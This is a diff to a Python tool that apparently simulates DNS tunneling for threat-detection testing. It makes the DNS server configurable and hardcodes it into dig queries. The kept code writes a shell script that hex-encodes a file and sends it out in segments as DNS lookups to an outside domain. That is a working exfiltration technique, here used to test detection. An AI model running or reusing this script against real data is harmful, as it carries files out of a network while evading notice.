@@ -31,7 +31,7 @@ def find_gcloud_path():
     return "gcloud"  # Fallback to system PATH
 
 
-def generate_dnst_data_exfiltration(domain: str = "ladytisiphone.com", anycast_ip: str = "") -> str:
+def generate_dnst_data_exfiltration(domain: str = "ladytisiphone.com", anycast_ip: str = "", dns_server: str = "169.154.169.254") -> str:
     """
     Generate DNS tunneling (DNST) test data for threat detection.
     Based on the dnst_detector.py approach but integrated for category analysis.
@@ -39,6 +39,7 @@ def generate_dnst_data_exfiltration(domain: str = "ladytisiphone.com", anycast_i
     Args:
         domain (str): Domain to use for DNS tunneling simulation (default: ladytisiphone.com)
         anycast_ip (str): Anycast IP to use for DNS queries (empty for default)
+        dns_server (str): DNS server to use for queries (default: 169.154.169.254, use 'legacy' for no DNS server)
         
     Returns:
         str: The generated DNST domain used for tunneling (base domain for threat correlation)
@@ -76,10 +77,17 @@ def generate_dnst_data_exfiltration(domain: str = "ladytisiphone.com", anycast_i
         
         # Create exfiltration script
         fh = open("domain_add.sh", "w+")
+        
+        # Construct dig commands based on dns_server parameter
+        if dns_server and dns_server.lower() != 'legacy':
+            dns_option = f' {dns_server}'
+        else:
+            dns_option = ''
+        
         data = f'if [ ! -e "test_exfiltration.txt" ]; then echo "File does not exists"; else i=0;host -t A ' \
-               f'646e735f31302e747874.1.{domain_start} {anycast_ip}; hexdump -e \'27/1 "%02x" "\\n"\' ' \
-               f'"test_exfiltration.txt" | (while read line; do host -t A $line"."$i".{dnst_domain}" {anycast_ip};i=$(($i+1)) ' \
-               f'; done ; host -t A 646e735f31302e747874.1.{domain_stop} {anycast_ip}; echo \'Segments sent: \' ' \
+               f'646e735f31302e747874.1.{domain_start}{dns_option}; hexdump -e \'27/1 "%02x" "\\n"\' ' \
+               f'"test_exfiltration.txt" | (while read line; do host -t A $line"."$i".{dnst_domain}"{dns_option};i=$(($i+1)) ' \
+               f'; done ; host -t A 646e735f31302e747874.1.{domain_stop}{dns_option}; echo \'Segments sent: \' ' \
                f'$i); fi'
         fh.write(data)
         fh.close()
@@ -970,7 +978,7 @@ def execute_ssh_dig_queries_batch(project_id: str, vm_name: str, zone: str, doma
             # Create a single command that queries all domains in the batch
             dig_commands = []
             for domain in batch_domains:
-                dig_commands.append(f"echo '=== {domain} ==='; dig +short {domain}; echo")
+                dig_commands.append(f"echo '=== {domain} ==='; dig @169.154.169.254 +short {domain}; echo")
             
             # Combine all dig commands into a single SSH session
             batch_command = "; ".join(dig_commands)
@@ -991,7 +999,7 @@ def execute_ssh_dig_queries_batch(project_id: str, vm_name: str, zone: str, doma
                 logger.warning(f"⚠️ Batch {batch_num + 1} failed, falling back to individual queries")
                 for domain in batch_domains:
                     try:
-                        dig_command = f"dig +short {domain}"
+                        dig_command = f"dig @169.154.169.254 +short {domain}"
                         exit_code_single, output_single = run_ssh_command(project_id, vm_name, zone, dig_command, timeout=15)
                         
                         if exit_code_single == 0:
@@ -1019,7 +1027,7 @@ def execute_ssh_dig_queries_batch(project_id: str, vm_name: str, zone: str, doma
                         logger.error(f"❌ Error querying {domain}: {e}")
                         results[domain] = {
                             'status': 'exception',
-                            'dig_command': f"dig +short {domain}",
+                            'dig_command': f"dig @169.154.169.254 +short {domain}",
                             'raw_response': '',
                             'error_message': str(e),
                             'exception': True
@@ -1077,7 +1085,7 @@ def parse_batch_dig_output(output: str, domains: List[str]) -> Dict[str, Dict]:
             if domain:
                 results[domain] = {
                     'status': 'success' if ip_addresses else 'no_response',
-                    'dig_command': f"dig +short {domain}",
+                    'dig_command': f"dig @169.154.169.254 +short {domain}",
                     'raw_response': '\n'.join(dig_output_lines),
                     'ip_addresses': ip_addresses,
                     'response_count': len(ip_addresses),
@@ -1094,7 +1102,7 @@ def parse_batch_dig_output(output: str, domains: List[str]) -> Dict[str, Dict]:
             if domain not in results:
                 results[domain] = {
                     'status': 'parse_error',
-                    'dig_command': f"dig +short {domain}",
+                    'dig_command': f"dig @169.154.169.254 +short {domain}",
                     'raw_response': '',
                     'error_message': 'Domain not found in batch output',
                     'ip_addresses': [],
@@ -1110,7 +1118,7 @@ def parse_batch_dig_output(output: str, domains: List[str]) -> Dict[str, Dict]:
         return {
             domain: {
                 'status': 'exception',
-                'dig_command': f"dig +short {domain}",
+                'dig_command': f"dig @169.154.169.254 +short {domain}",
                 'raw_response': '',
                 'error_message': f"Error parsing batch output: {str(e)}",
                 'exception': True
